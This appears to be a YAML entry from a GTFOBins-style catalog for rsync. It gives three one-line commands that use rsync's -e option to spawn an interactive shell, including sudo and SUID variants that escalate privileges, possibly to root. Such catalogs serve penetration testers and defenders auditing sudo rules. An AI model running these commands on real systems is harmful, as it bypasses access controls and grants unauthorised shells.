---
functions:
  execute-interactive:
    - code: rsync -e 'bash -c "exec 10<&0 11>&1 0<&2 1>&2; sh -i"' 127.0.0.1:/dev/null
  sudo-enabled:
    - code: sudo rsync -e 'bash -c "exec 10<&0 11>&1 0<&2 1>&2; sh -i"' 127.0.0.1:/dev/null
  suid-enabled:
    - code: ./rsync -e 'bash -p -c "exec 10<&0 11>&1 0<&2 1>&2; sh -i"' 127.0.0.1:/dev/null
---
